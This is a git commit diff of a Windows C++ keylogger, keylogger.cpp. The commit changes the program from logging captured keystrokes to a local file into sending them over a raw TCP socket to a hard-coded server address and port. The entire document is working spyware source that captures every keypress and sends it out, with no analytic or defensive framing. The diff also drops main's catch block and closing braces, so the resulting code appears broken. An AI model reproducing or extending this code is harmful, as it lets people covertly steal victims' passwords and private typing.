f6a7d3d6057123b0602f70972cd94c5fce2752c1
Danilo Nori <55815889+DaniloNori@users.noreply.github.com>
2023-07-04 23:02:21 -0500

    Update keylogger.cpp

--- keylogger.cpp
+++ keylogger.cpp
@@ -1,31 +1,80 @@
-#include <fstream>
 #include <iostream>
 #include <chrono>
 #include <thread>
+#include <fstream>
 #include <Windows.h>
+#include <winsock2.h>
 
-// Define a function to write the pressed key to a log file
-void write_to_file(char key) {
-    static std::ofstream logfile("log.txt", std::ios_base::app);
+#pragma comment(lib, "ws2_32.lib")
 
-    if (logfile) {
-        logfile << key;
+std::ofstream openLogFile(const std::string& filename) {
+    std::ofstream logfile(filename, std::ios_base::app);
+    if (!logfile) {
+        throw std::runtime_error("failed to open log file.");
     }
+    return logfile;
 }
 
-// Define a function to listen to the keyboard and call the write_to_file function when a key is pressed
-void keyboard_listener() {
+bool isLetterKey(char key) {
+    return (key >= 'A' && key <= 'Z');
+}
+
+void writeToFile(std::ofstream& logfile, char key) {
+    logfile << key;
+}
+
+void sendToServer(const std::string& serverIP, int port, const std::string& data) {
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        throw std::runtime_error("Failed to initialize Winsock.");
+    }
+
+    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
+    if (clientSocket == INVALID_SOCKET) {
+        WSACleanup();
+        throw std::runtime_error("Failed to create socket.");
+    }
+
+    sockaddr_in serverAddr{};
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(port);
+    serverAddr.sin_addr.s_addr = inet_addr(serverIP.c_str());
+
+    if (connect(clientSocket, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
+        closesocket(clientSocket);
+        WSACleanup();
+        throw std::runtime_error("Failed to connect to the server.");
+    }
+
+    send(clientSocket, data.c_str(), static_cast<int>(data.length()), 0);
+
+    closesocket(clientSocket);
+    WSACleanup();
+}
+
+void keyboardListener(const std::string& serverIP, int port) {
+    std::string data;
+
     while (true) {
         for (int i = 8; i <= 255; i++) {
             if (GetAsyncKeyState(i) & 0x8000) {
                 char key = static_cast<char>(i);
 
-                // If the key is a letter, convert it to lowercase
-                if (key >= 'A' && key <= 'Z') {
+                if (isLetterKey(key)) {
                     key += 32;
                 }
 
-                write_to_file(key);
+                data += key;
+            }
+        }
+
+        if (!data.empty()) {
+            try {
+                sendToServer(serverIP, port, data);
+                data.clear();
+            }
+            catch (const std::exception& e) {
+                std::cerr << "Error sending data to the server: " << e.what() << std::endl;
             }
         }
 
@@ -34,17 +83,9 @@ void keyboard_listener() {
 }
 
 int main() {
+    std::string serverIP = "192.168.0.1";
+    int port = 1234;
+
     try {
-        // Create a thread to listen to the keyboard
-        std::thread listener_thread(keyboard_listener);
-
-        // Wait for the thread to finish
-        listener_thread.join();
+        keyboardListener(serverIP, port);
     }
-    catch (const std::exception& e) {
-        std::cerr << "Error: " << e.what() << std::endl;
-        return 1;
-    }
-
-    return 0;
-}
